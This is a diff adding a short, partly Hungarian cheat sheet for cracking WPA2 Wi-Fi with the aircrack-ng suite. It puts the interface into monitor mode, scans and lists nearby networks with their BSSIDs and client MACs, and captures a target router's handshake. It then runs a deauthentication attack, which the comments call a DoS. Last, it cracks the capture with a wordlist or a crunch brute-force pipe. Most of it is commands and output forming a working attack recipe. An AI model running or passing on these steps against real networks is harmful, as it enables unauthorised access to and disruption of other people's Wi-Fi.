@@ -1,0 +1,64 @@
+# SHOW WLANS
+
+	iwconfig
+
+# START AIRMON MODE
+# Megszakad a wifi kapcsolat, ha volt, elkezdünk monitorozni...
+# 
+	# START
+	sudo airmon-ng start wlp6s0
+	# STOP
+	sudo airmon-ng stop wlp6s0mon
+
+# MONITORING:
+# Show: wlp6s0mon or your network interface...
+	iwconfig
+# Search Target mac adresses, pl: 34:2C:C4:A1:4F:BC
+
+	sudo airodump-ng wlp6s0mon
+
+# RESULT OF MONITORING:
+# Choose your target
+	 CH 14 ][ Elapsed: 54 s ][ 2020-08-12 19:18 
+
+ BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID
+
+ 80:20:DA:86:77:16  -44       61      161    6  11  130        CCMP   PSK  Morfyum-m
+ 82:20:DA:86:79:17  -44       61        3    0  11  130   OPN              WellHello
+ 36:2C:94:A1:4F:BC  -82       61        0    0   6  130   WPA2 CCMP   MGT  UPC Wi-Fr
+ 34:2C:C4:A1:4F:BC  -81       55        7    0   6  130   WPA2 CCMP   PSK  UPC453905
+ 5C:B1:3E:A6:0F:70  -85       25        0    0   6  270        CCMP   PSK  Telekom-0
+ 10:06:45:90:EC:9B  -88       18        0    0   1  130        CCMP   PSK  Telekom-W
+
+ BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
+
+ 80:20:DA:86:77:16  EC:1F:72:45:06:5B  -29    0 -24     19        5                  
+ 80:20:DA:86:77:16  50:C7:BF:78:FB:CA  -46    0 - 0e     0        6                  
+ 80:20:DA:86:77:16  64:DB:43:54:22:CF  -70    0e- 0e     0      440                  
+ 34:2C:C4:A1:4F:BC  F0:8A:76:8A:E6:E8   -1    1e- 0      0        1             
+
+# TYPE YOUR TARGET BSSID, Channel (CH), and the capture file
+# monitoring the router for a long time
+
+	sudo airodump-ng --bssid 34:2C:C4:A1:4F:BC -c 6 -w ./test wlp6s0mon
+
+# DEAUTHENTICATE - DOS ATTACK VS ROUTER. You can deny acces to 
+# KIHAGYHATÓ!!! EZ CSAK DOS TÁMADÁST CSINÁL
+#
+	sudo aireplay-ng -0 4 -a 34:2C:C4:A1:4F:BC wlp6s0mon
+
+
+# TWO PATH TO CRACK WIFI 
+
+	# 1. Is use a word file and attack wifi by .cap file
+	# ADD WORDLIST AND TRY TO AUTHENTICATE
+
+	sudo aircrack-ng ./test-01.cap -w ./wordlists/wordlist.txt
+
+	# Tipikus hibaüzenet: 
+	# Ez azért van, mert nem sikerült kellő adatot rögzíteni a .cap fájlba
+	Packets contained no EAPOL data; unable to process this AP.
+
+	# 2. Use BSSID (mac) and STATION (mac) address, and give combination of letters and number
+
+	crunch 8 8 qwertzuiopasdfghjklyxcvbnm123456789 | aircrack-ng -w - ./test-01.cap --bssid 34:2C:C4:A1:4F:BC
